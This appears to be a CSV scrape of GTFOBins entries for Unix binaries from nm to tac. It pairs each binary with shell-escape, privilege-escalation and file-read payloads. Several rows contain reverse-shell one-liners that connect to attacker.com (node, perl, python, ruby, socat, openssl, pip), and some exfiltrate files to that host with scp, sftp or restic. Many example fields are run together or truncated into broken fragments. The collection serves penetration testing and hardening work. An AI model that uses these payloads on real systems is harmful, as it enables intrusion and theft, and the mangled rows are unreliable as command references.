Binary Name,URL,Description,Functions,Examples
nm,https://gtfobins.github.io/gtfobins/nm/,"The file content is treated as command line options and disclosed through error messages, so this is not suitable for reading arbitrary binary data.",File read; SUID; Sudo,"LFILE=file_to_read
nm @$LFILE; sh -p; -p"
nmap,https://gtfobins.github.io/gtfobins/nmap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; SUID; Sudo; Limited SUID,"TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF; nmap --interactive
nmap> !sh; nc -l -p 12345"
node,https://gtfobins.github.io/gtfobins/node/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Bind shell; File upload; File download; File write; File read; SUID; Sudo; Capabilities,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
require(""net"").connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'"
nohup,https://gtfobins.github.io/gtfobins/nohup/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; SUID; Sudo,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)""; COMMAND='/usr/bin/id'
nohup ""$COMMAND""
cat nohup.out; sh -p"
npm,https://gtfobins.github.io/gtfobins/npm/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,npm exec /bin/sh; preinstall; npm -C $TF run preinstall
nroff,https://gtfobins.github.io/gtfobins/nroff/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo,"TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff; LFILE=file_to_read
nroff $LFILE; sudo"
nsenter,https://gtfobins.github.io/gtfobins/nsenter/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,nsenter /bin/sh; sudo; sudo nsenter /bin/sh
ntpdate,https://gtfobins.github.io/gtfobins/ntpdate/,The file is actually parsed and lines are leaked through error messages.,File read; SUID; Sudo,"LFILE=file_to_read
ntpdate -a x -k $LFILE -d localhost; sh -p; -p"
octave,https://gtfobins.github.io/gtfobins/octave/,The payloads are compatible with GUI.,Shell; File write; File read; Sudo; Limited SUID,"octave-cli --eval 'system(""/bin/sh"")'; octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'; octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
od,https://gtfobins.github.io/gtfobins/od/,"Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.",File read; SUID; Sudo,"LFILE=file_to_read
od -An -c -w9999 ""$LFILE""; sh -p; -p"
openssl,https://gtfobins.github.io/gtfobins/openssl/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345; RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s; openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save"
openvpn,https://gtfobins.github.io/gtfobins/openvpn/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"openvpn --dev null --script-security 2 --up '/bin/sh -c sh'; LFILE=file_to_read
openvpn --config ""$LFILE""; sh -p"
openvt,https://gtfobins.github.io/gtfobins/openvt/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; COMMAND=id
TF=$(mktemp -u)
sudo openvt -- sh -c ""$COMMAND >$TF 2>&1""
cat $TF"
opkg,https://gtfobins.github.io/gtfobins/opkg/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF; sudo opkg install x_1.0_all.deb"
pandoc,https://gtfobins.github.io/gtfobins/pandoc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"lua; TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' >$TF
pandoc -L $TF /dev/null; LFILE=file_to_write
echo DATA | pandoc -t plain -o ""$LFILE"""
paste,https://gtfobins.github.io/gtfobins/paste/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
paste $LFILE; sh -p; -p"
pax,https://gtfobins.github.io/gtfobins/pax/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read,"tar; LFILE=file_to_read
pax -w ""$LFILE"""
pdb,https://gtfobins.github.io/gtfobins/pdb/,"This allows to execute python code, other functions may apply.",Shell; Sudo,"python; TF=$(mktemp)
echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont; sudo"
pdflatex,https://gtfobins.github.io/gtfobins/pdflatex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'; pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -; sudo"
pdftex,https://gtfobins.github.io/gtfobins/pdftex/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,pdftex --shell-escape '\write18{/bin/sh}\end'; sudo; sudo pdftex --shell-escape '\write18{/bin/sh}\end'
perf,https://gtfobins.github.io/gtfobins/perf/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,perf stat /bin/sh; sh -p; -p
perl,https://gtfobins.github.io/gtfobins/perl/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File read; SUID; Sudo; Capabilities,"perl -e 'exec ""/bin/sh"";'; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
perl -e 'use Socket;$i=""$ENV{RHOST}"";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'"
perlbug,https://gtfobins.github.io/gtfobins/perlbug/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'; sudo; sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
pexec,https://gtfobins.github.io/gtfobins/pexec/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,pexec /bin/sh; sh -p; -p
pg,https://gtfobins.github.io/gtfobins/pg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; SUID; Sudo,"pg /etc/profile
!/bin/sh; pg file_to_read; sh -p"
php,https://gtfobins.github.io/gtfobins/php/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; Reverse shell; File upload; File download; File write; File read; SUID; Sudo; Capabilities,"export CMD=""/bin/sh""
php -r 'system(getenv(""CMD""));'; export CMD=""/bin/sh""
php -r 'passthru(getenv(""CMD""));'; export CMD=""/bin/sh""
php -r 'print(shell_exec(getenv(""CMD"")));'"
pic,https://gtfobins.github.io/gtfobins/pic/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"pic -U
.PS
sh X sh X; LFILE=file_to_read
pic $LFILE; sudo"
pico,https://gtfobins.github.io/gtfobins/pico/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo; Limited SUID,"pico
^R^X
reset; sh 1>&0 2>&0; SPELL; -s"
pidstat,https://gtfobins.github.io/gtfobins/pidstat/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; SUID; Sudo,"COMMAND=id
pidstat -e $COMMAND; sh -p; -p"
pip,https://gtfobins.github.io/gtfobins/pip/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo,"TF=$(mktemp -d)
echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
pip install $TF; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
pip install $TF"
pkexec,https://gtfobins.github.io/gtfobins/pkexec/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo pkexec /bin/sh
pkg,https://gtfobins.github.io/gtfobins/pkg/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF; sudo pkg install -y --no-repo-update ./x-1.0.txz"
posh,https://gtfobins.github.io/gtfobins/posh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,posh; sudo; sudo posh
pr,https://gtfobins.github.io/gtfobins/pr/,Some bytes are altered so it might not be suitable for binary files.,File read; SUID; Sudo,"LFILE=file_to_read
pr -T $LFILE; sh -p; -p"
pry,https://gtfobins.github.io/gtfobins/pry/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"pry
system(""/bin/sh""); sudo; sudo pry
system(""/bin/sh"")"
psftp,https://gtfobins.github.io/gtfobins/psftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"psftp
!/bin/sh; sudo; sudo psftp
!/bin/sh"
psql,https://gtfobins.github.io/gtfobins/psql/,"This invokes the default pager, which is likely to be less, other functions may apply.",Shell; Sudo,"less; psql
\?
!/bin/sh; sudo"
ptx,https://gtfobins.github.io/gtfobins/ptx/,"While the program is capable of reading the file, it outputs a “permuted index” of its content, thus altering it. Adjusting the options could yield more readable outputs.",File read; SUID; Sudo,"LFILE=file_to_read
ptx -w 5000 ""$LFILE""; sh -p; -p"
puppet,https://gtfobins.github.io/gtfobins/puppet/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }""; LFILE=""/tmp/file_to_write""
puppet apply -e ""file { '$LFILE': content => 'DATA' }""; diff"
pwsh,https://gtfobins.github.io/gtfobins/pwsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,"pwsh; export LFILE=file_to_write
pwsh -c '""DATA"" | Out-File $env:LFILE'; sudo"
python,https://gtfobins.github.io/gtfobins/python/,The payloads are compatible with both Python version 2 and 3.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities,"python -c 'import os; os.system(""/bin/sh"")'; socat file:`tty`,raw,echo=0 tcp-listen:12345; export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'"
rake,https://gtfobins.github.io/gtfobins/rake/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File read; Sudo; Limited SUID,"rake -p '`/bin/sh 1>&0`'; LFILE=file-to-read
rake -f $LFILE; sudo"
rc,https://gtfobins.github.io/gtfobins/rc/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,rc -c '/bin/sh'; sh -p; -p
readelf,https://gtfobins.github.io/gtfobins/readelf/,Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as readelf options thus some file contents may lead to unexpected results.,File read; SUID; Sudo,"readelf; LFILE=file_to_read
readelf -a @$LFILE; sh -p"
red,https://gtfobins.github.io/gtfobins/red/,Read and write files limited to the current directory.,File write; File read; Sudo,"red file_to_write
a
DATA
.
w
q; red file_to_read
,p
q; sudo"
redcarpet,https://gtfobins.github.io/gtfobins/redcarpet/,The file is actually parsed as a Markdown file.,File read; Sudo,"LFILE=file_to_read
redcarpet ""$LFILE""; sudo; LFILE=file_to_read
sudo redcarpet ""$LFILE"""
redis,https://gtfobins.github.io/gtfobins/redis/,This works with versions lower than 7.,File write,"IP=127.0.0.1
redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save"
restic,https://gtfobins.github.io/gtfobins/restic/,"The attacker must setup a server to receive the backups, in the following example rest-server is used but there are other options. To start a new instance and create a new repository:",File upload; SUID; Sudo,"RPORT=12345
NAME=backup_name
./rest-server --listen "":$RPORT""
restic init -r ""rest:http://localhost:$RPORT/$NAME""; restic restore -r ""/tmp/restic/$NAME"" latest --target .; RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
rev,https://gtfobins.github.io/gtfobins/rev/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
rev $LFILE | rev; sh -p; -p"
rlogin,https://gtfobins.github.io/gtfobins/rlogin/,"Usually rlogin is a symlink to ssh, the following works only when the real rlogin is used (e.g., from the rsh-client APT package).",File upload,rlogin; ssh; rsh-client
rlwrap,https://gtfobins.github.io/gtfobins/rlwrap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"rlwrap /bin/sh; echo; LFILE=file_to_write
rlwrap -l ""$LFILE"" echo DATA"
rpm,https://gtfobins.github.io/gtfobins/rpm/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'; rpm --pipe '/bin/sh 0<&1'; sudo"
rpmdb,https://gtfobins.github.io/gtfobins/rpmdb/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,rpmdb --eval '%(/bin/sh 1>&2)'; sudo; sudo rpmdb --eval '%(/bin/sh 1>&2)'
rpmquery,https://gtfobins.github.io/gtfobins/rpmquery/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'; sudo; sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'"
rpmverify,https://gtfobins.github.io/gtfobins/rpmverify/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,rpmverify --eval '%(/bin/sh 1>&2)'; sudo; sudo rpmverify --eval '%(/bin/sh 1>&2)'
rsync,https://gtfobins.github.io/gtfobins/rsync/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null; sh -p; -p"
rtorrent,https://gtfobins.github.io/gtfobins/rtorrent/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent; sh -p; -p"
ruby,https://gtfobins.github.io/gtfobins/ruby/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; File upload; File download; File write; File read; Library load; Sudo; Capabilities,"ruby -e 'exec ""/bin/sh""'; nc -l -p 12345; export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'"
run-mailcap,https://gtfobins.github.io/gtfobins/run-mailcap/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; Sudo,"less; run-mailcap --action=view /etc/hosts
!/bin/sh; vi"
run-parts,https://gtfobins.github.io/gtfobins/run-parts/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,run-parts --new-session --regex '^sh$' /bin; sh -p; -p
runscript,https://gtfobins.github.io/gtfobins/runscript/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"TF=$(mktemp)
echo '! exec /bin/sh' >$TF
runscript $TF; sudo; TF=$(mktemp)
echo '! exec /bin/sh' >$TF
sudo runscript $TF"
rview,https://gtfobins.github.io/gtfobins/rview/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"rview; :py3; rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
rvim,https://gtfobins.github.io/gtfobins/rvim/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Non-interactive reverse shell; Non-interactive bind shell; File upload; File download; File write; File read; Library load; SUID; Sudo; Capabilities; Limited SUID,"rvim; :py3; rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
sash,https://gtfobins.github.io/gtfobins/sash/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,sash; sh -p; -p
scanmem,https://gtfobins.github.io/gtfobins/scanmem/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"scanmem
shell /bin/sh; sh -p; -p"
scp,https://gtfobins.github.io/gtfobins/scp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo; Limited SUID,"TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x ""$TF""
scp -S $TF x y:; RPATH=user@attacker.com:~/file_to_save
LPATH=file_to_send
scp $LFILE $RPATH; RPATH=user@attacker.com:~/file_to_get
LFILE=file_to_save
scp $RPATH $LFILE"
screen,https://gtfobins.github.io/gtfobins/screen/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,screen; \n; \r\n
script,https://gtfobins.github.io/gtfobins/script/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; Sudo,script -q /dev/null; script -q -c 'echo DATA' file_to_write; sudo
scrot,https://gtfobins.github.io/gtfobins/scrot/,This requires a running X server.,Shell; Sudo; Limited SUID,scrot -e /bin/sh; sudo; sudo scrot -e /bin/sh
sed,https://gtfobins.github.io/gtfobins/sed/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; File write; File read; SUID; Sudo,bash; sed -n '1e exec sh 1>&0' /etc/hosts; sed e
service,https://gtfobins.github.io/gtfobins/service/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,/usr/sbin/service ../../bin/sh; sudo; sudo service ../../bin/sh
setarch,https://gtfobins.github.io/gtfobins/setarch/,The uname -m command can be used in place of arch to obtain the architecture.,Shell; SUID; Sudo,uname -m; arch; setarch $(arch) /bin/sh
setfacl,https://gtfobins.github.io/gtfobins/setfacl/,"This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID; Sudo,sh -p; -p; sh
setlock,https://gtfobins.github.io/gtfobins/setlock/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,"TF=$(mktemp)
setlock $TF /bin/sh; sh -p; -p"
sftp,https://gtfobins.github.io/gtfobins/sftp/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; Sudo,"HOST=user@attacker.com
sftp $HOST
!/bin/sh; RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save; RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save"
sg,https://gtfobins.github.io/gtfobins/sg/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo,sg $(id -ng); sudo; sudo sg root
shuf,https://gtfobins.github.io/gtfobins/shuf/,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",File write; File read; SUID; Sudo,"LFILE=file_to_write
shuf -e DATA -o ""$LFILE""; LFILE=file_to_read
shuf -z ""$LFILE""; sh -p"
slsh,https://gtfobins.github.io/gtfobins/slsh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Sudo; Limited SUID,"slsh -e 'system(""/bin/sh"")'; sudo; sudo slsh -e 'system(""/bin/sh"")'"
smbclient,https://gtfobins.github.io/gtfobins/smbclient/,A valid SMB/CIFS server must be available.,Shell; File upload; File download; Sudo,"smbclient '\\attacker\share'
!/bin/sh; sudo smbserver.py share /tmp; smbclient '\\attacker\share' -c 'put file_to_send where_to_save'"
snap,https://gtfobins.github.io/gtfobins/snap/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta; sudo snap install xxxx_1.0_all.snap --dangerous --devmode"
socat,https://gtfobins.github.io/gtfobins/socat/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Reverse shell; Bind shell; File upload; File download; File write; File read; Sudo; Limited SUID,"socat stdin exec:/bin/sh; socat file:`tty`,raw,echo=0 tcp-listen:12345; RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
socket,https://gtfobins.github.io/gtfobins/socket/,It can send back a reverse shell to a listening attacker to open a remote network access.,Reverse shell; Bind shell,"nc -l -p 12345; RHOST=attacker.com
RPORT=12345
socket -qvp '/bin/sh -i' $RHOST $RPORT; nc target.com 12345"
soelim,https://gtfobins.github.io/gtfobins/soelim/,"The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.",File read; SUID; Sudo,"LFILE=file_to_read
soelim ""$LFILE""; sh -p; -p"
softlimit,https://gtfobins.github.io/gtfobins/softlimit/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,softlimit /bin/sh; sh -p; -p
sort,https://gtfobins.github.io/gtfobins/sort/,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",File read; SUID; Sudo,"LFILE=file_to_read
sort -m ""$LFILE""; sh -p; -p"
split,https://gtfobins.github.io/gtfobins/split/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; Command; File write; File read; Sudo,"split --filter=/bin/sh /dev/stdin; COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF; COMMAND=id
echo | split --filter=$COMMAND /dev/stdin"
sqlite3,https://gtfobins.github.io/gtfobins/sqlite3/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; File read; SUID; Sudo; Limited SUID,"sqlite3 /dev/null '.shell /bin/sh'; LFILE=file_to_write
sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'; LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF"
sqlmap,https://gtfobins.github.io/gtfobins/sqlmap/,"This allows to execute python code, other functions may apply.",Shell; Sudo,"python; sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""; sudo"
ss,https://gtfobins.github.io/gtfobins/ss/,The file content is actually parsed so only a part of the first line is returned as a part of an error message.,File read; SUID; Sudo,"LFILE=file_to_read
ss -a -F $LFILE; sh -p; -p"
ssh-agent,https://gtfobins.github.io/gtfobins/ssh-agent/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,ssh-agent /bin/sh; sh -p; -p
ssh-keygen,https://gtfobins.github.io/gtfobins/ssh-keygen/,It loads shared libraries that may be used to run code in the binary execution context.,Library load; SUID; Sudo,ssh-keygen -D ./lib.so; sh -p; -p
ssh-keyscan,https://gtfobins.github.io/gtfobins/ssh-keyscan/,The file content is actually parsed so only a part of each line is returned as a part of an error message.,File read; SUID; Sudo,"LFILE=file_to_read
ssh-keyscan -f $LFILE; sh -p; -p"
ssh,https://gtfobins.github.io/gtfobins/ssh/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File upload; File download; File read; Sudo,ssh localhost $SHELL --noprofile --norc; ssh -o ProxyCommand=';sh 0<&2 1>&2' x; host
sshpass,https://gtfobins.github.io/gtfobins/sshpass/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,sshpass /bin/sh; sh -p; -p
start-stop-daemon,https://gtfobins.github.io/gtfobins/start-stop-daemon/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,start-stop-daemon -n $RANDOM -S -x /bin/sh; sh -p; -p
stdbuf,https://gtfobins.github.io/gtfobins/stdbuf/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; SUID; Sudo,stdbuf -i0 /bin/sh; sh -p; -p
strace,https://gtfobins.github.io/gtfobins/strace/,It can be used to break out from restricted environments by spawning an interactive system shell.,Shell; File write; SUID; Sudo,"strace -o /dev/null /bin/sh; strace - DATA; LFILE=file_to_write
strace -s 999 -o $LFILE strace - DATA"
strings,https://gtfobins.github.io/gtfobins/strings/,"This only returns ASCII strings, thus it is not suitable for binary files.",File read; SUID; Sudo,"LFILE=file_to_read
strings ""$LFILE""; sh -p; -p"
su,https://gtfobins.github.io/gtfobins/su/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo su
sudo,https://gtfobins.github.io/gtfobins/sudo/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,sudo; sudo sudo /bin/sh
sysctl,https://gtfobins.github.io/gtfobins/sysctl/,It can be used to break out from restricted environments by running non-interactive system commands.,Command; File read; SUID; Sudo,"COMMAND='/bin/sh -c id>/tmp/id'
sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id; -p; -n"
systemctl,https://gtfobins.github.io/gtfobins/systemctl/,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",SUID; Sudo,sh -p; -p; sh
systemd-resolve,https://gtfobins.github.io/gtfobins/systemd-resolve/,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",Sudo,"sudo; less; sudo systemd-resolve --status
!sh"
tac,https://gtfobins.github.io/gtfobins/tac/,Make sure that RANDOM does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of RANDOM-separated chunks.,File read; SUID; Sudo,"RANDOM; LFILE=file_to_read
tac -s 'RANDOM' ""$LFILE""; sh -p"
